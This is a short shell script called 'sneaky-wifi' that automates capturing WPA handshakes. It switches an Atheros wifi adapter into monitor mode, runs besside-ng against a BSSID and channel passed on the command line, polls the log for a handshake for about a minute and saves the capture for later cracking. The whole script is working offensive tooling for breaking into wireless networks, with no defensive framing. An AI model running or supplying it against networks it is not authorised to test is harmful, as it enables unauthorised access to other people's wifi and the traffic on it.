#! /bin/sh

## written by Arnaud Meauzoone april 2017

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

filePath='/usr/local/sneaky-wifi'
filePathSneakyCapture='/usr/local/sneaky-wifi/sneaky-capture'

clean() {
  echo "Cleaning up"

  if [ -f $filePathSneakyCapture/besside.log ]
  then
    rm $filePathSneakyCapture/besside.log
  fi

  if [ -f $filePathSneakyCapture/wep.cap ]
  then
    rm $filePathSneakyCapture/wep.cap
  fi

  if [ -f $filePathSneakyCapture/wpa.cap ]
  then
    rm $filePathSneakyCapture/wpa.cap
  fi
}

capture() {
sp='/-\|'
STARTTIME=$(date +%s)
while true ; do
  if ! grep -Fq "handshake" besside.log;
    then
      printf '\b%.1s' "$sp"
      sp=${sp#?}${sp%???}
    else

      cp $filePathSneakyCapture/wpa.cap $filePath/wpa.cap

      echo ""

      echo "${GREEN}OK${NC}: WPA handshake found !!"
      echo "${GREEN}OK${NC}: Everythings seems to be good so far !!"
      echo "${GREEN}OK${NC}: Please check $filePath/wpa.cap"
      exit 0
  fi
  ENDTIME=$(date +%s)
  if [ $(($ENDTIME - $STARTTIME)) -gt 60 ];
  then

    echo "${RED}FAIL${NC}: WPA handshake not found !! "

    exit 0
  fi
done
}

cd $filePathSneakyCapture

clear
clean

interface=`airmon-ng | grep "Atheros" | awk '{print $2}'`

if [ "$interface" = "" ]
then
  echo "${RED}ERROR${NC}: Wifi device not found"
  echo "${RED}ERROR${NC}: insert a wifi key compatible with monitor mode "
  echo "${RED}ERROR${NC}: For now we only support the TL-WN722N"
  echo "${RED}ERROR${NC}: Quitting !! "
  exit 0
fi

ifconfig $interface down

echo "${GREEN}OK${NC}: Wifi device found ... going on !"

if iwconfig $interface mode monitor ; then
  echo "${GREEN}OK${NC}: wifi device now in monotor mode"
else
  exit 0
fi

ifconfig $interface up

timeout 30 nohup $filePathSneakyCapture/besside-ng -b $1 -c $2 $interface > /dev/null 2>&1 &

sleep 1

echo "waiting for capture. It can take as much as 1 minute"
capture
